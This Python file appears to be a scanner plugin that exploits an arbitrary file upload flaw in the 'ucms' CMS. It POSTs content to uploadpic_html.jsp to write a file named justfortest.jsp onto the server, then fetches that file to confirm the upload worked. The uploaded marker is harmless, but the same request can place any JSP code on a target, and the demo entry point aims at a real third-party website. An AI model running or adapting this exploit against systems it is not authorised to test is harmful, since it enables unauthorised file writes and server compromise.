#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

def info(data=None):
    info = {
        "name": "ucms upload",
        "info": "ucms upload.",
        "level": "high",
        "type": "upload"
    }
    return info

def prove(data):
    xmldata = '''
    <?xml version="1.0" encoding="UTF-8"?>
    <root>
    dGVzdCBieSBtZQ==
    </root>
    '''
    data = init(data,'ucms')
    if data['base_url']:
        for url in [data['base_url'], data['url']]:
            myurl = url + '/ucms/cms/client/uploadpic_html.jsp?toname=justfortest.jsp&diskno=xxxx'
            res = curl('post',myurl,data = xmldata)
            if res != None and res.status_code is 200:
                myurl = url + '/ucms/cms-data/temp_dir/xxxx/temp.files/justfortest.jsp'
                testres = curl('post',myurl,data = xmldata)
                if testres != None and 'test by me' in testres.text:
                    data['flag'] = 1
                    data['data'].append({"page": myurl})
                    data['res'].append({"info": myurl, "key": "ucms upload"})
    return data


if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))